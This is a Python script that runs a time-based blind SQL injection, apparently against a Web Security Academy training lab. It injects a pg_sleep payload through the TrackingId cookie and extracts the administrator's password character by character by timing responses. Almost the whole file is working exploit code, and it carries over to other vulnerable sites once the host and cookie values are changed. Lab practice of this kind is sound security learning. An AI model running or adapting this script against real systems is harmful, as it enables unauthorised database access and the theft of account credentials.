#!/usr/bin/python3

import string
import requests
import time

def perform_blind_sqli_attack():

    # Characters that can be in the password
    characters = string.ascii_lowercase + string.digits
    
    # # Indicator that the request is correct
    # trigger = 'Welcome back!'
    
    # Change the next variables for correct values (host and cookies)
    host = '0a5100cf047686f6826dd0e000510084.web-security-academy.net'
    tracking_id = 'qTkwiEEGAHV4haoJ'
    session = '9CNki514EbgaLapShDFrg7bFFluW6nDl'
    

    # Variable to send in the request
    url = f'https://{host}/filter'
    params = {'category': 'Accessories'}
    headers = { 
        'Host': host
    }
    
    print('[!] Start Request...')

    password = ''
    finish = False

    for i in range(1,21):
        
        for c in characters:

            sqli = f"'||( SELECT pg_sleep(2) FROM users WHERE username = 'administrator' AND SUBSTRING(password,{i},1) = '{c}') -- -"
            headers['Cookie'] = f"TrackingId={tracking_id}{sqli}; session={session}"
            
            start_time = time.time()
            response = requests.get(url, params = params, headers=headers)
            end_time = time.time()

            elapsed_time = end_time - start_time

            print(headers['Cookie'])
            print(elapsed_time)
        
            if elapsed_time > 2:
                password += c
                break


        

    ascii_art = """"
            .--.
        |__| .--------.
        |=.| |.------.|
        |--| || SQLi ||
        |  | |'------'|
        |__|~')______('
    """
    
    print(ascii_art)
    print(f'[!] Password: {password}')

if __name__ == '__main__':
    perform_blind_sqli_attack()
